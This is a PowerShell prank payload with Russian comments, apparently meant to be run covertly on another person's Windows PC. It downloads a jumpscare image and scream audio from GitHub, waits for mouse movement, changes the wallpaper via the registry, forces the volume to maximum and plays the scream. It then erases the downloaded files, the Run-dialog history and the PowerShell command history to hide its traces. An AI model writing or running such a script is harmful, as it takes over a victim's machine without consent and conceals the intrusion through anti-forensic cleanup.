# Укажите РЯДОМ со своими ссылками свои прямые адреса с GitHub:
$imageUrl = "https://github.com/mix29335-lgtm/my_scream/raw/refs/heads/main/jumpscare.png"
$wavUrl   = "https://github.com/mix29335-lgtm/my_scream/raw/refs/heads/main/female_scream.wav"

# 1. Скачиваем ваши файлы во временную папку компьютера под именами my_image.png и my_sound.wav
Invoke-WebRequest -Uri $imageUrl -OutFile "$env:TMP\my_image.png"
Invoke-WebRequest -Uri $wavUrl -OutFile "$env:TMP\my_sound.wav"

# 2. Функция ожидания движения мыши (чтобы скример сработал внезапно)
function Pause-Script {
    Add-Type -AssemblyName System.Windows.Forms
    $originalX = [System.Windows.Forms.Cursor]::Position.X
    $shell = New-Object -ComObject WScript.Shell
    while ($true) {
        if ([System.Windows.Forms.Cursor]::Position.X -ne $originalX) { break }
        # Мигаем капслоком раз в 3 секунды, чтобы ПК не ушел в спящий режим
        $shell.SendKeys("{CAPSLOCK}"); Start-Sleep -Seconds 3
    }
}

# 3. Функция смены обоев рабочего стола
function Set-WallPaper {
    param ([string]$Image)
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value "2" -Force
    New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -PropertyType String -Value "0" -Force
    
    $code = @"
    using System; using System.Runtime.InteropServices;
    public class WP { [DllImport("User32.dll",CharSet=CharSet.Unicode)] public static extern int SystemParametersInfo (int uAction, int uParam, string lpvParam, int fuWinIni); }
"@
    Add-Type -TypeDefinition $code
    [WP]::SystemParametersInfo(0x0014, 0, $Image, 0x01 -bor 0x02)
}

# 4. Функция воспроизведения звука
function Play-WAV {
    $player = New-Object System.Media.SoundPlayer
    $player.SoundLocation = "$env:TMP\my_sound.wav"
    $player.PlaySync()
}

# 5. Выкручиваем системную громкость Windows на максимум
$shell = New-Object -ComObject WScript.Shell
for ($i = 0; $i -lt 50; $i++) { $shell.SendKeys([char]175) }

# АКТИВАЦИЯ ЦЕПОЧКИ
Pause-Script
Set-WallPaper -Image "$env:TMP\my_image.png"
Play-WAV

# БЛОК ОЧИСТКИ СЛЕДОВ (Выполняется сразу после воспроизведения звука)

# 1. Удаляем именно те файлы, которые скачали (my_image.png и my_sound.wav)
Remove-Item "$env:TMP\my_image.png" -Force -ErrorAction SilentlyContinue
Remove-Item "$env:TMP\my_sound.wav" -Force -ErrorAction SilentlyContinue

# 2. Очищаем историю окна "Выполнить" (Win+R) в реестре
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name * -ErrorAction SilentlyContinue

# 3. Стираем историю введенных команд в консоли PowerShell
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue

# Чистим за собой CapsLock (выключаем, если остался включен)
if ([System.Windows.Forms.Control]::IsKeyLocked('CapsLock')) { $shell.SendKeys('{CapsLock}') }
